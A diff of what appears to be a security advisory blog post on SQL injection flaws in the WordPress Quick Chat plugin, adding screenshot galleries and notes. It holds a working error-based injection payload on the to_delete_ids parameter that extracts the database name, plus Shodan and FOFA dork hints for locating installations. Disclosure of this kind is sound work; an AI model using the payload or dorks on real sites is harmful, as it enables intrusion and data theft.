@@ -29,12 +29,23 @@ gallerypoc1:
 gallerypoc2:
           - url: /assets/images/Quick-Chat-SQLi/SQL1_false_req.png
             image_path: /assets/images/Quick-Chat-SQLi/SQL1_false_req.png
-            alt: "SQLi False statment response"
-            title: "SQLi False statment response"
+            alt: "SQLi False statment request"
+            title: "SQLi False statment request"
           - url: /assets/images/Quick-Chat-SQLi/SQL1_false_rsp.png
             image_path: /assets/images/Quick-Chat-SQLi/SQL1_false_rsp.png
             alt: "SQLi False statment response"
             title: "SQLi False statment response"
+gallerypoc3:
+          - url: /assets/images/Quick-Chat-SQLi/SQL2_error_req.png
+            image_path: /assets/images/Quick-Chat-SQLi/SQL2_error_req.png
+            alt: "SQLi Error based request"
+            title: "SQLi Error based request"
+          - url: /assets/images/Quick-Chat-SQLi/SQL2_error_rsp.png
+            image_path: /assets/images/Quick-Chat-SQLi/SQL2_error_rsp.png
+            alt: "SQLi Error based response"
+            title: "SQLi Error based response"
+            
+            
 hidden: true
 toc: true
 toc_label: "Index"
@@ -66,20 +77,20 @@ The vulnerable parameter is **username_check** as we can apreciate on the follow
 {% include gallery id="gallerypoc1" %}
 {% include gallery id="gallerypoc2" %}
 
-
+*Note: if "no_participation" is set to 1, login is requiered to preceed with the injection.* 
 
 ## SQL Injection 2
 
 **Status: patched on version 4.0**
 
-The plugin is subject to SQL injections throught the ajax call. This SQLi can be found on the **to_delete_ids** parameter when using the action **quick-chat-ajax-delete**.
+The plugin was subject to SQL injections throught the ajax call. This SQLi can be found on the **to_delete_ids** parameter when using the action **quick-chat-ajax-delete**.
 
-Proof of concept to get the current database name:
+Proof of concept to get the current database name using an error based technique:
 ```sql
 action=quick-chat-ajax-delete&to_delete_ids[]=666,(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
 ```
 
-
+{% include gallery id="gallerypoc2" %}
 
 ## Dorks
 The pluging sets the cookie "quick_chat_alias" so it can be easely tracked searching for it on [shodan.io](https://www.shodan.io/) or [fofa.so](https://fofa.so)
